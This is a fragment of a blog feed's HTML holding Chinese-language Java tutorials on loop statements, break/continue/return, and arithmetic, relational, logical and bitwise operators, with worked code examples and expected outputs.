MS">do-while语句的语法形式如下：<br>&emsp;&emsp;<font color="red">     do{<br>&emsp;&emsp;                        语句块<br>&emsp;&emsp;                         }while（布尔表达式）;<br></font><br><strong>说明：</strong>do：语句的关键字； 语句块：循环体，是一个语句，若是多个语句则应构成复合语句； 布尔表达式：循环条件。<br></font> </p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>例3-8<span class="token punctuation">]</span> Sum2.java 用do-while循环语句计算s<span class="token operator">=</span>1+2+3+……100class Sum2<span class="token punctuation">{</span>    public static void main<span class="token punctuation">(</span>String args<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        int i<span class="token operator">=</span>1<span class="token punctuation">;</span>         //循环次数，初值为１        int s<span class="token operator">=</span>0<span class="token punctuation">;</span>         //累加和s初值为0        do<span class="token punctuation">{</span>              //开始无条件循环            s<span class="token operator">=</span>s+i<span class="token punctuation">;</span>       //s增加i            i++<span class="token punctuation">;</span>         //循环次数加１        <span class="token punctuation">}</span>while<span class="token punctuation">(</span>i<span class="token operator">&lt;=</span>100<span class="token punctuation">)</span><span class="token punctuation">;</span>  //循环总数100        System.out.println<span class="token punctuation">(</span><span class="token string">"s="</span>+s<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br>&emsp;</p><h5 id="for-语句"><font color="#00B2EE" face="Comic sans MS">for 语句  </font><a href="post/Java-Language-2-3#for-语句"></a></h5><p><font face="Comic sans MS">for语句的语法形式为：<br>&emsp;&emsp;<font color="red">for（表达式1；表达式2；表达式3）<br>&emsp;&emsp;                  {   语句块<br>&emsp;&emsp;                  }<br></font><br><strong>说明：</strong>（表达式1；表达式2；表达式3）：循环条件； 语句块：循环体，是一个语句，若是多个语句则应构成复合语句。</font></p><p><font color="red"> <strong>for语句的执行过程如下：</strong></font><br>（1）按表达式1将初值赋给循环控制变量；<br>（2）按表达式2判断循环是否成立，如果成立则执行循环体，否则退出循环；<br>（3）执行一次循环后，执行表达式3修改控制变量。<br> </p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>例3-9<span class="token punctuation">]</span> sum3.java 编程求S<span class="token operator">=</span>12+22+…92 public class sum3<span class="token punctuation">{</span>    public static void main<span class="token punctuation">(</span>String args<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        int s<span class="token operator">=</span>0<span class="token punctuation">;</span>        for<span class="token punctuation">(</span>int i<span class="token operator">=</span>1<span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>9<span class="token punctuation">;</span>i++<span class="token punctuation">)</span>           s<span class="token operator">=</span>s+i*i<span class="token punctuation">;</span>           System.out.println<span class="token punctuation">(</span><span class="token string">"s="</span>+s<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><div class="article-bounded"><div class="article-table"><table><tr><td bgcolor="#ADD8E6"><font face="Comic sans MS"><font color="red">**for语句使用注意：**</font>    1.  逗号语句分隔的语句系列,被看作一个语句，这样就可以在只能放一个语句的地方放任意多个语句，只须用逗    号将它们分隔开。如：       for ( i=1,j=10;i < j;i++,j--)      {    ……    }2.  表达式1、表达式2及表达式3都可以为空语句(但分号不能省略) 如：         for(  ;  ;  ) { … }     相当于while(true)   <p><font color="red"><strong>循环的嵌套：</strong></font><br>一个循环体内又包含<font color="red">另一个完整的循环结构</font> ，称为循环的嵌套。内嵌的循环中还可以嵌套循环，这就是多重<br>循环。上述三种循环（while循环，do-while循环和for循环）语句之间可以相互嵌套使用。<br></p></font></td></tr></table></div></div><p></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>例3-10<span class="token punctuation">]</span> 百鸡问题。      已知公鸡5元1只，母鸡3元一只，小鸡1元3只，要求用100元刚好买100只鸡，问有多少种采购方案。     分析: 设变量I、J、K分别代表公鸡数、母鸡数及小鸡数，则应满足下列一些条件:① I+J+K<span class="token operator">=</span>100<span class="token punctuation">(</span>只<span class="token punctuation">)</span>，I,J,K0<span class="token punctuation">;</span>② 5I+3J+K/3<span class="token operator">=</span>100（元）<span class="token punctuation">;</span>③ 若用100元全部买公鸡，最多只能买20只, 所以I≤20<span class="token punctuation">;</span>若全部买母鸡最多只能买33只，所以J≤33<span class="token punctuation">;</span>   而小鸡数目就是100-I-J<span class="token punctuation">;</span><span class="token punctuation">(</span>简化计算<span class="token punctuation">)</span>     根据以上分析，可编程如下：public class  Loop_Loop <span class="token punctuation">{</span>    public static void main<span class="token punctuation">(</span>String args<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      int I,J,K<span class="token punctuation">;</span>      System.out.println<span class="token punctuation">(</span><span class="token string">" I    J    K "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">for</span>  <span class="token punctuation">(</span>I<span class="token operator">=</span>0<span class="token punctuation">;</span>I<span class="token operator">&lt;=</span>20<span class="token punctuation">;</span>I++ <span class="token punctuation">)</span>       <span class="token punctuation">{</span> <span class="token keyword">for</span> <span class="token punctuation">(</span> J<span class="token operator">=</span>0<span class="token punctuation">;</span>J<span class="token operator">&lt;=</span>33<span class="token punctuation">;</span>J++<span class="token punctuation">)</span>            <span class="token punctuation">{</span> K<span class="token operator">=</span>100-I-J<span class="token punctuation">;</span>                              <span class="token keyword">if</span> <span class="token punctuation">(</span>5*I+3*J+K/3.0<span class="token operator">==</span>100<span class="token punctuation">)</span>         //注意“K/3.0”              System.out.println<span class="token punctuation">(</span>I+<span class="token string">"   "</span>+J+<span class="token string">"   "</span>+K<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>   <span class="token punctuation">}</span>  <span class="token punctuation">}</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br>&emsp;</p><h4 id="2-3-跳转语句"><font color="#3CB371" face="Comic sans MS">2.3  跳转语句</font><a href="post/Java-Language-2-3#2-3-跳转语句"></a></h4><h5 id="break语句"><font color="#00B2EE" face="Comic sans MS">break语句  </font><a href="post/Java-Language-2-3#break语句"></a></h5><p><font face="Comic sans MS"><font color="red"><strong>作用：</strong></font>  使程序的流程从一个语句块的内部跳转出来。<br>(1) 从switch语句的分支中跳出来<br>(2) 从循环体内跳出来<br></font> </p><p>对上述的(1)(2)举例如下：<font color="#00B2EE"><strong>(1) break用于跳出switch语句</strong></font>  </p><pre class="line-numbers language-bash"><code class="language-bash">switch<span class="token punctuation">(</span>grade<span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token keyword">case</span> <span class="token string">'A'</span><span class="token keyword">:</span> <span class="token keyword">case</span> <span class="token string">'B'</span><span class="token keyword">:</span> <span class="token keyword">case</span> <span class="token string">'C'</span><span class="token keyword">:</span> System.out.println<span class="token punctuation">(</span><span class="token string">"及格\n "</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> ‘D’: System.out.println<span class="token punctuation">(</span>“不及格\n "<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash"><code class="language-bash">习题1：分析该程序的输出结果int x<span class="token operator">=</span>5<span class="token punctuation">;</span>do<span class="token punctuation">{</span>          switch<span class="token punctuation">(</span>x%2<span class="token punctuation">)</span>          <span class="token punctuation">{</span>                <span class="token keyword">case</span> 1: x--<span class="token punctuation">;</span>                            <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token keyword">case</span> 0: x++<span class="token punctuation">;</span>                            <span class="token keyword">break</span><span class="token punctuation">;</span>           <span class="token punctuation">}</span>           x--<span class="token punctuation">;</span>           System.out.println<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>while<span class="token punctuation">(</span>x<span class="token operator">></span>0<span class="token punctuation">)</span><span class="token punctuation">;</span>运行结果：31-1习题2：分析该程序的输出结果int a<span class="token operator">=</span>5,b<span class="token operator">=</span>6,i<span class="token operator">=</span>0,j<span class="token operator">=</span>0<span class="token punctuation">;</span>switch<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">case</span> 5: switch<span class="token punctuation">(</span>b<span class="token punctuation">)</span>                    <span class="token punctuation">{</span>                          <span class="token keyword">case</span> 5:i++<span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span>                          <span class="token keyword">case</span> 6:j++<span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span>                          default:i++<span class="token punctuation">;</span>j++<span class="token punctuation">;</span>                     <span class="token punctuation">}</span>         <span class="token keyword">case</span> 6: i++<span class="token punctuation">;</span>j++<span class="token punctuation">;</span>                     <span class="token keyword">break</span><span class="token punctuation">;</span>         default: i++<span class="token punctuation">;</span>j++<span class="token punctuation">;</span><span class="token punctuation">}</span>System.out.println<span class="token punctuation">(</span>i+<span class="token string">","</span>+j<span class="token punctuation">)</span><span class="token punctuation">;</span>运行结果：1,2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br><font color="#00B2EE"><strong>(2) break用于跳出循环体</strong></font>  </p><p><strong>break可用于跳出for循环、while循环、do while循环。</strong></p><pre class="line-numbers language-bash"><code class="language-bash">int sum<span class="token operator">=</span>0<span class="token punctuation">;</span>      for<span class="token punctuation">(</span>int i<span class="token operator">=</span>1<span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>100<span class="token punctuation">;</span>i++<span class="token punctuation">)</span><span class="token punctuation">{</span>      sum<span class="token operator">=</span>sum+i<span class="token punctuation">;</span>      if<span class="token punctuation">(</span>i<span class="token operator">==</span>50<span class="token punctuation">)</span>break<span class="token punctuation">;</span><span class="token punctuation">}</span>System.out.println<span class="token punctuation">(</span>sum<span class="token punctuation">)</span><span class="token punctuation">;</span>    //结果为1275<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br>&emsp;<br><font color="red"><strong>如果break在多重循环中，只退出break所在的那层循环到外层循环中。</strong></font>  </p><pre class="line-numbers language-bash"><code class="language-bash">int sum<span class="token operator">=</span>0<span class="token punctuation">;</span>      for<span class="token punctuation">(</span>int i<span class="token operator">=</span>1<span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>100<span class="token punctuation">;</span>i++<span class="token punctuation">)</span><span class="token punctuation">{</span>       sum<span class="token operator">=</span>sum+i<span class="token punctuation">;</span>       while<span class="token punctuation">(</span>i<span class="token operator">==</span>50<span class="token punctuation">)</span><span class="token punctuation">{</span>i<span class="token operator">=</span>100<span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span>System.out.println<span class="token punctuation">(</span>sum<span class="token punctuation">)</span><span class="token punctuation">;</span>       //结果为1275<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br>&emsp;</p><h5 id="continue-语句"><font color="#00B2EE" face="Comic sans MS">continue 语句 </font><a href="post/Java-Language-2-3#continue-语句"></a></h5><p><font face="Comic sans MS"><font color="red"><strong>作用：</strong></font>用来结束所在循环语句块的本次循环<br><font color="red"><strong>注意:</strong></font>continue语句只能在循环语句中使用。<br></font></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>例3-11<span class="token punctuation">]</span> ConDemo.javapublic class ConDemo<span class="token punctuation">{</span>public static void main<span class="token punctuation">(</span>String args<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  int index<span class="token operator">=</span>0<span class="token punctuation">;</span>  while<span class="token punctuation">(</span>index<span class="token operator">&lt;=</span>99<span class="token punctuation">)</span> <span class="token punctuation">{</span>    index+<span class="token operator">=</span>10<span class="token punctuation">;</span>           if<span class="token punctuation">(</span>index<span class="token operator">==</span>40<span class="token punctuation">)</span>  <span class="token keyword">continue</span><span class="token punctuation">;</span>     System.out.println<span class="token punctuation">(</span><span class="token string">"   The index is "</span>+index<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>程序运行结果：   The index is 10   The index is 20   The index is 30   The index is 50   The index is 60   The index is 70   The index is 80   The index is 90   The index is 100<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br>&emsp;<br><font face="Comic sans MS"><font color="red"><strong>循环体中使用break语句和continue语句的区别：</strong></font><br><font color="#00B2EE"><strong>Break语句</strong></font>  结束整个循环,不再判断执行循环的条件;<br><font color="#00B2EE"><strong>Continue语句</strong></font>只结束本次循环,而不是终止整个循环的执行。<br></font>  </p><p>&emsp;<br>&emsp;</p><h5 id="return-语句"><font color="#00B2EE" face="Comic sans MS">return 语句  </font><a href="post/Java-Language-2-3#return-语句"></a></h5><p><font face="Comic sans MS"><strong>格式：</strong>   <font color="red">return  表达式;</font><br><strong>用途：</strong><br>(1) 结束方法的运行，并返回一个值；<br>(2) 如果该方法没有返回值（void），则return后不能跟表达式。<br></font></p><blockquote><blockquote><p>例如：  return  0;<br>&emsp;&emsp;&emsp;   return;</p></blockquote></blockquote><p><strong>思考:分析以下程序运行结果</strong></p><pre class="line-numbers language-bash"><code class="language-bash">1. public class ArithmeticOp<span class="token punctuation">{</span>    public static void main<span class="token punctuation">(</span>String args<span class="token punctuation">[</span> <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>       int a,b,c<span class="token punctuation">;</span>       a<span class="token operator">=</span>b<span class="token operator">=</span>c<span class="token operator">=</span>2<span class="token punctuation">;</span>       a<span class="token operator">=</span>++b - ++c<span class="token punctuation">;</span>     //0 3 3       System.out.println（″a<span class="token operator">=</span>″+a+″b<span class="token operator">=</span>″+b+″c<span class="token operator">=</span>″+c）<span class="token punctuation">;</span>       a <span class="token operator">=</span>b++ + c++<span class="token punctuation">;</span>    //6 4 4       System.out.println（″a<span class="token operator">=</span>″+a+″b<span class="token operator">=</span>″+b+″c<span class="token operator">=</span>″+c）<span class="token punctuation">;</span>       a <span class="token operator">=</span>b-- + c--<span class="token punctuation">;</span>    //8 3 3       System.out.println（″a<span class="token operator">=</span>″+a+″b<span class="token operator">=</span>″+b+″c<span class="token operator">=</span>″+c）<span class="token punctuation">;</span>     <span class="token punctuation">}</span><span class="token punctuation">}</span>2.public class TestSwitch<span class="token punctuation">{</span>    public static void main<span class="token punctuation">(</span>String args<span class="token punctuation">[</span> <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>       int  x<span class="token operator">=</span>1,y<span class="token operator">=</span>2,i<span class="token operator">=</span>0,j<span class="token operator">=</span>0<span class="token punctuation">;</span>       switch<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">{</span>          <span class="token keyword">case</span> 1: switch<span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">{</span>                   <span class="token keyword">case</span> 1: i++<span class="token punctuation">;</span>                   <span class="token keyword">break</span><span class="token punctuation">;</span>                   <span class="token keyword">case</span> 2: j++<span class="token punctuation">;</span>                   <span class="token keyword">break</span><span class="token punctuation">;</span>                   default:i++<span class="token punctuation">;</span>                    j++<span class="token punctuation">;</span><span class="token punctuation">}</span>           //i<span class="token operator">=</span>0 j<span class="token operator">=</span>1          <span class="token keyword">case</span> 2: i++<span class="token punctuation">;</span>                  j++<span class="token punctuation">;</span>              //i<span class="token operator">=</span>1 j<span class="token operator">=</span>2                  <span class="token keyword">break</span><span class="token punctuation">;</span>          default:i++<span class="token punctuation">;</span>                  j++<span class="token punctuation">;</span>       <span class="token punctuation">}</span>      System.out.println<span class="token punctuation">(</span><span class="token string">"i="</span>+i<span class="token punctuation">)</span><span class="token punctuation">;</span>      System.out.println<span class="token punctuation">(</span><span class="token string">"j="</span>+j<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>                              //i<span class="token operator">=</span>1<span class="token punctuation">}</span>                                  //j<span class="token operator">=</span>23.public class J_Test<span class="token punctuation">{</span>  static boolean mb_fun<span class="token punctuation">(</span>char c<span class="token punctuation">)</span>  <span class="token punctuation">{</span>    System.out.print<span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  public  static void main<span class="token punctuation">(</span>String args<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>       int i<span class="token operator">=</span>0<span class="token punctuation">;</span>       for<span class="token punctuation">(</span>mb_fun<span class="token punctuation">(</span>‘A’<span class="token punctuation">)</span><span class="token punctuation">;</span>mb_fun<span class="token punctuation">(</span>‘B’<span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span>i<span class="token operator">&lt;</span>2<span class="token punctuation">)</span><span class="token punctuation">;</span>mb_fun<span class="token punctuation">(</span>‘C’<span class="token punctuation">))</span>       <span class="token punctuation">{</span>   i++<span class="token punctuation">;</span>           mb_fun<span class="token punctuation">(</span>‘D’<span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span>     //结果： A B D C B D C B<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><hr><p>&emsp;<br>&emsp;<br>&emsp;<br>&emsp;</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java学习 </tag>
            
            <tag> Java语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java运算符和数据类型转换(3.4-3.6)</title>
      <link href="/post/Java-Language-2-2/"/>
      <url>/post/Java-Language-2-2/</url>
      
        <content type="html"><![CDATA[<p>&ensp;<br>&ensp;</p><center><font color="#3CB371" face="Comic sans MS" size="5">运算符及表达式、运算符的优先级、数据类型转换</font></center><ul><li><input disabled type="checkbox"> <strong>3.4-3.6学习知识点</strong><ul><li><input disabled type="checkbox"> 运算符及表达式<ul><li><input disabled type="checkbox"> 算术运算符</li><li><input disabled type="checkbox"> 关系运算符</li><li><input disabled type="checkbox"> 逻辑运算符</li><li><input disabled type="checkbox"> 位运算符</li><li><input disabled type="checkbox"> 赋值运算符</li><li><input disabled type="checkbox"> 逻辑运算符</li></ul></li><li><input disabled type="checkbox"> 运算符的优先级</li><li><input disabled type="checkbox"> 数据类型转换<ul><li><input disabled type="checkbox"> 自动类型转换</li><li><input disabled type="checkbox"> 手动强制类型转换</li><li><input disabled type="checkbox"> 隐含强制类型转换</li></ul></li></ul></li></ul><p>&ensp;<br>&ensp;</p><h3 id="一、-运算符及表达式"><font color="#FF6347" face="Comic sans MS">一、 运算符及表达式 </font><a href="post/Java-Language-2-2#一、-运算符及表达式"></a></h3><p><font face="Comic sans MS">&emsp;Java可以对各种类型的数据进行加工，这种加工过程称为<font color="#00B2EE"><strong>运算</strong></font> 。其中表示各种不同运算的符号称为<font color="#00B2EE"><strong>运算符</strong></font> ，参与运算的数据称为<font color="#00B2EE"><strong>操作数</strong></font> 。操作数和运算符按一定语法形式组成的符号序列称为表达式。每个表达式经过运算后都会产生一个确定的值。<br></font> </p><div class="article-bounded"><div class="article-table"><table><tr><td bgcolor="#ADD8E6"><font face="Comic sans MS"><font color="red">**📒运算符按其功能分为七类：**</font>1. 算术运算符  + 、-、 \*、 /、%、 ++、 --2. 关系运算符  > 、<、>=、 <=、 =="、" !="3." 逻辑运算符 ！、&&、||、&、| 4. 位运算符>>、<<、>>>、&、|、^、~5. 条件运算符  ？：6. 赋值运算符  =、+=、-= 、\*= 、/=7. 其他：下标运算符[]<p><font color="red"><strong>📒运算符按其要求的操作数个数分为三种：</strong></font></p><ol><li>一元运算符  如  ++、–</li><li>二元运算符  如  +、-、*、/、%(求模)</li><li>三元运算符  如  ？：<br></li></ol></、></=、></、></font></td></tr></table></div></div><hr><hr><p>&emsp;</p><h4 id="1-1-算术运算符"><font color="#3CB371" face="Comic sans MS">1.1  算术运算符</font><a href="post/Java-Language-2-2#1-1-算术运算符"></a></h4><div class="article-bounded"><div class="article-table"><table><tr><td bgcolor="#ADD8E6"><font face="Comic sans MS"><font color="red">**📒算术运算符中的单目运算符**</font>          如   +（一元加，取正值）、               -（一元减，取负值）、               ++ （增1运算符）、\-\- （减1运算符）<p><strong>增1运算符(++)和减1运算符(--)：</strong><br>   只能用于变量，而不能用于常量或表达式。增量运算符和减量运算符的功能是将操作数的值加1或减1.</p><p>(1)<font color="red">增1运算符（减1运算符）在操作数的<strong>前面</strong>，</font>首先对操作数本身进行增减1运算，然后再参与其所在表达式的<br>  运算。<br>例：如果变量a的值为5，求下列表达式及a的值<br>      ① ++a +10<br>          表达式的值为16，a变为6<br>      ② --a +10<br>          表达式的值为14，a变为4<br>(2)<font color="red">增1运算符（减1运算符）在操作数的<strong>后面</strong>，</font>则首先让操作数参与计算整个表达式的值，然后再对操作数进行<br>   增减运算<br>  例：如果变量a的值为5，求下列表达式及a的值<br>            ① a++ +10<br>                   表达式的值为15，a变为6<br>            ② a-- +10<br>                   表达式的值为15，a变为4<br></p></font></td></tr></table></div></div><p></p><pre class="line-numbers language-bash"><code class="language-bash">练习题1：写出该程序的输出结果class <span class="token function">test</span><span class="token punctuation">{</span>      public static void main<span class="token punctuation">(</span>String args<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span>           int a<span class="token operator">=</span>5<span class="token punctuation">;</span>           System.out.println<span class="token punctuation">(</span>++a<span class="token punctuation">)</span><span class="token punctuation">;</span>           System.out.println<span class="token punctuation">(</span>--a<span class="token punctuation">)</span><span class="token punctuation">;</span>           System.out.println<span class="token punctuation">(</span>a++<span class="token punctuation">)</span><span class="token punctuation">;</span>           System.out.println<span class="token punctuation">(</span>a--<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token punctuation">}</span>                        输出结果：6556<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><div class="article-bounded"><div class="article-table"><table><tr><td bgcolor="#ADD8E6"><font face="Comic sans MS"><font color="red">**📒算术运算符中的双目运算符 **</font>        如     +（加）、-（减）、\*（乘）、/（除）、  % （取余数或取模）。       +，-，\* 是通常意义的加、减、乘如果整数相除，则结果取整。如 5/2 得到结果2。    如果浮点数相除，则是我们通常意义上的除法，如5.0/2.0结果为2.5。%是取余，如 5%2结果为1                         5.2%2结果为1.2                         5.2%2.2结果为0.8                          10%-4结果2； -10%-4结果-2 <p><font color="red"><strong>注意：</strong></font> 如果整数相除或取模 第二个操作数为0 编译无错 运行会出错 抛出异常；<br>          如果浮点数相除或取模 第二个操作数为0 结果为NaN 。<br>注意：</p><ol><li>整数    int a=10/0     运行报错<pre><code>         int a=10%0   运行报错</code></pre></li><li>浮点数<br>  double a=10.0/0     Infinity(正无穷大)<br>  double a=-10.0/0   -Infinity（负无穷大）<br>  double a=0.0/0        NaN<br>  double a=0.0%0        NaN<br></li></ol></font></td></tr></table></div></div><blockquote><blockquote><p><strong>思考：</strong>某个培训中心要为新到的学员安排房间，假设共有x个学员，每个房间可以住6人，让你用一个公式来计算他们要住的房间数？<br>答案：  (x+5)/6<br>这也可以用于计算留言板的页数。 </p></blockquote></blockquote><p>&emsp;<br>&emsp;</p><h4 id="1-2-关系运算符"><font color="#3CB371" face="Comic sans MS">1.2  关系运算符</font><a href="post/Java-Language-2-2#1-2-关系运算符"></a></h4><font face="Comic sans MS"><font color="#00B2EE">**1.关系运算符有七种：**</font>== ，!= ，< ,<= ,> ,>= , instanceof  (对象运算符)<font color="#00B2EE">**2.关系表达式的结果类型为布尔型**</font><font color="#00B2EE">**3.instanceof：**</font>用来确定一对象是否是某一指定类的对象</=></font><pre class="line-numbers language-bash"><code class="language-bash"> class <span class="token function">test</span><span class="token punctuation">{</span>    public static void main<span class="token punctuation">(</span>String args<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span>    <span class="token function">test</span> t1<span class="token operator">=</span>new test<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          if<span class="token punctuation">(</span>t1 instanceof test<span class="token punctuation">)</span><span class="token punctuation">{</span> System.out.println<span class="token punctuation">(</span><span class="token string">"是"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>         <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br><font color="red" face="Comic sans MS"><strong>📒关系表达式</strong></font></p><div class="article-img"><p><img src="https://i.loli.net/2019/01/11/5c3864c7165e7.png" alt="1.png" data-zoomable></p></div><p>&emsp;<br>&emsp;</p><h4 id="1-3-逻辑运算符"><font color="#3CB371" face="Comic sans MS">1.3  逻辑运算符</font><a href="post/Java-Language-2-2#1-3-逻辑运算符"></a></h4><div class="article-img"><p><img src="https://i.loli.net/2019/01/11/5c3866ddb16bb.png" alt="2.png" data-zoomable> <img src="https://i.loli.net/2019/01/11/5c38674613277.png" alt="3.png" data-zoomable></p></div><pre class="line-numbers language-bash"><code class="language-bash">例：分析下列程序的输出结果class test<span class="token punctuation">{</span>        public static void main<span class="token punctuation">(</span>String args<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>         boolean s<span class="token punctuation">;</span>int i<span class="token operator">=</span>100<span class="token punctuation">;</span>        s<span class="token operator">=</span><span class="token punctuation">(</span>3<span class="token operator">></span>2<span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span>i++<span class="token operator">==</span>1<span class="token punctuation">)</span><span class="token punctuation">;</span>        System.out.println<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>        i<span class="token operator">=</span>100<span class="token punctuation">;</span>        s<span class="token operator">=</span><span class="token punctuation">(</span>3<span class="token operator">&lt;</span>2<span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span>i++<span class="token operator">==</span>1<span class="token punctuation">)</span><span class="token punctuation">;</span>        System.out.println<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span> 输出结果：101100<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br>&emsp;</p><h4 id="1-4-位运算符"><font color="#3CB371" face="Comic sans MS">1.4  位运算符</font><a href="post/Java-Language-2-2#1-4-位运算符"></a></h4><div class="article-img"><p><img src="https://i.loli.net/2019/01/11/5c386923e4c7a.png" alt="4.png" data-zoomable><img src="https://i.loli.net/2019/01/11/5c38692468530.png" alt="5.png" data-zoomable></p></div><pre class="line-numbers language-bash"><code class="language-bash">例：分析下列程序的输出结果int a<span class="token operator">=</span>7, b<span class="token operator">=</span>8, c<span class="token punctuation">;</span>    c <span class="token operator">=</span> a <span class="token operator">&amp;</span> b<span class="token punctuation">;</span>     //c<span class="token operator">=</span>00000000000000000000000000000000<span class="token operator">=</span>0    c <span class="token operator">=</span> a <span class="token operator">|</span> b<span class="token punctuation">;</span>     //c<span class="token operator">=</span>00000000000000000000000000001111<span class="token operator">=</span>15    c <span class="token operator">=</span> a ^ b<span class="token punctuation">;</span>     //c<span class="token operator">=</span>00000000000000000000000000001111<span class="token operator">=</span>15    c <span class="token operator">=</span>~a<span class="token punctuation">;</span>         //c<span class="token operator">=</span>11111111111111111111111111111000<span class="token operator">=</span>-8例：分析下列程序的输出结果    int a<span class="token operator">=</span>7,c<span class="token punctuation">;</span>     //a<span class="token operator">=</span>00000000000000000000000000000111    c <span class="token operator">=</span> a<span 